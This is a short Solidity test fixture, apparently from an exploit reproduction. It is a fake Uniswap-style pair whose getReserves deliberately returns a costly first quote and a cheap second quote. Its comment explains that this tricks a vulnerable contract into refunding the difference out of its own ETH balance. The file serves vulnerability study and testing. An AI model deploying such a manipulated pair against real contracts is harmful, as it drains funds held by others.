pragma solidity ^0.8.20;
interface IHelper { function transfer(address to,uint256 value) external returns(bool); }
contract PairFixture {
    address public constant WETH=0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public helper;
    uint256 public calls;
    function init(address token) external { helper=token; }
    function getReserves() external view returns(uint112 reserve0,uint112 reserve1,uint32 blockTimestampLast) {
        // The first quote is expensive and the second quote is cheap. The
        // vulnerable contract refunds using only the second quote, so the
        // difference is paid from its pre-existing ETH balance.
        uint256 rin = calls==0 ? 200000000000000000 : 1000000000000000;
        uint256 rout = 2000000000000000000;
        if (WETH < helper) { reserve0=uint112(rin); reserve1=uint112(rout); }
        else { reserve0=uint112(rout); reserve1=uint112(rin); }
        blockTimestampLast=uint32(block.timestamp);
    }
    function swap(uint256 amount0Out,uint256 amount1Out,address to,bytes calldata) external {
        uint256 out=amount0Out>0?amount0Out:amount1Out; require(out>0,"PAIR: zero"); calls += 1; require(IHelper(helper).transfer(to,out),"PAIR: token transfer");
    }
}
